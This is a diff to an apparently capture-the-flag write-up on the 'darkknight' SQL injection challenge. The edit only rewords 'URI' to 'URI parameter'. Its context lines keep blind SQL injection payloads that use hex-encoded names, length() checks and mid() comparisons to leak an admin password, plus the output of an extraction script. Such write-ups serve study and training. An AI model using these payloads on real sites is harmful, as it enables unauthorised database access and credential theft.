@@ -29,7 +29,7 @@ We have to use Hexadecimal representations instead of strings. Alternatively, we
 
 ### Retrieving the password length
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 1
@@ -47,7 +47,7 @@ Since the `Hello admin` message is not printed, we know that the resultant query
 
 That tells us that the length of the `pw` column is more than 1.
 
-If we keep increasing the length and provide the following URI:
+If we keep increasing the length and provide the following URI parameter:
 
 ```
 ?no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 8
@@ -74,7 +74,7 @@ Therefore, in order to leak the password, we will have to use the `mid()` functi
 
 ![3](https://github.com/Kunull/Write-ups/assets/110326359/2a05edee-9e1c-43b3-8970-4ea391376a28)
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?no=0 OR id LIKE 0x61646d696e AND mid(pw, 1, 1) LIKE 0x30
@@ -212,7 +212,7 @@ python .\darkknight_script.py
 [!] Final payload: ?pw=0b70ea1f
 ```
 
-Now, we can provide password URI:
+Now, we can provide password URI parameter:
 
 ```
 ?pw=0b70ea1f
